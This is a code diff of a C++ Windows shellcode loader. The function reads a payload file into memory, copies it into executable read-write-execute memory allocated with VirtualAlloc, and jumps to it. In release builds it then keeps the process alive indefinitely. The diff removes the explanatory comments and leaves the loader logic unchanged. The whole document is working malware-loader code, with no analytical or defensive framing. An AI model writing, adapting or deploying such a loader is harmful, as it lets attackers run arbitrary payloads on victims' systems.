@@ -73,7 +73,6 @@ void shellcode()
         return;
     }
 
-    // Get file size and read contents
     std::streamsize size = file.tellg();
     file.seekg(0, std::ios::beg);
     if (size <= 0) {
@@ -89,14 +88,14 @@ void shellcode()
     file.close();
 
     Log("[*] Buffer size: " + std::to_string(size));
-    // Optional: print first bytes for debugging
+
     char hexbuf[64] = { 0 };
     snprintf(hexbuf, 64, "Shellcode starts: %02X %02X %02X %02X %02X",
         (unsigned char)buf[0], (unsigned char)buf[1], (unsigned char)buf[2],
         (unsigned char)buf[3], (unsigned char)buf[4]);
     Log(hexbuf);
 
-    // Allocate RWX memory
+ 
     void* exec = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!exec) {
         Log("[-] VirtualAlloc failed.");
@@ -108,16 +107,15 @@ void shellcode()
 
     FlushInstructionCache(GetCurrentProcess(), exec, size);
 
-    // Execute the shellcode
-    // After shellcode execution
+   
     Log("[*] Executing shellcode now...");
     ((void(*)())exec)();
 
 #ifdef _DEBUG
-    // Just for debugging, don't sleep forever
-    Sleep(10000); // Sleep 10s
+   
+    Sleep(10000);
 #else
-    // Keep the process alive for as long as possible
+    
     while (true) {
         Sleep(10000);
     }
